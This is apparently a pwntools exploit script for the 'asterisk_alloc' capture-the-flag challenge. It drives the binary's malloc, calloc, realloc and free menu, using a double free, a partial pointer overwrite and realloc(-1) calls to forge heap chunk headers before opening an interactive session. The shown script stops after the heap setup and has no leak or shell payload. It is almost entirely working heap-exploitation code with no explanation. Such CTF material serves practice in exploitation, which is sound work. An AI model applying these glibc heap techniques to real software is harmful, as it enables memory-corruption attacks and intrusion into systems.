#!/usr/bin/env python2
# -*- coding: utf-8 -*-
from pwn import *
# CUSTOM FUNCTIONS
def _snd(s):
  io.send(str(s))
def _sndl(s):
  io.sendline(str(s))
def _snda(a,s):
  io.sendafter(str(a),str(s))
def _sndla(a,s):
  io.sendlineafter(str(a),str(s))
def _rcvu(s):
  return io.recvuntil(str(s))
def _rcva():
  return io.recvall()
def _rcvn(n):
  return io.recv(n)
context.terminal = ['tmux', 'split', '-h']

exe = context.binary = ELF('asterisk_alloc')
env = {'LD_PRELOAD':'./libc-asterisk.so.6'}
env = {}

host = args.HOST or 'ast-alloc.chal.ctf.westerns.tokyo'
port = int(args.PORT or 10001)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv,env=env, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv,env=env, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

gdbscript = '''
continue
'''.format(**locals())

# -- Exploit goes here --

def malloc(sz, data=None):
    _sndla(':', 1)
    _sndla(':', sz)
    if data == None: return
    _snda(':', data)
def calloc(sz, data=None):
    _sndla(':', 2)
    _sndla(':', sz)
    if data == None: return
    _snda(':', data)
def realloc(sz, data=None):
    _sndla(':', 3)
    _sndla(':', sz)
    if data == None: return
    _snda(':', data)
def free(c):
    _sndla(':', 4)
    _sndla(':', c)

io = start()
if args.GDB:
    _rcvu('\n')

realloc(0x28, p64(0x0) * 3 + p64(0x41))
calloc(0x428, p64(0x0) * 3 + p64(0x21) + p64(0x0) + p64(0x21))
malloc(0x28, "A")
free("r")
free("r")
realloc(0x28, "\x80")
realloc(-1)
realloc(0x28, "A")
realloc(-1)
realloc(0x28, p64(0) + p64(0x31))

io.interactive()

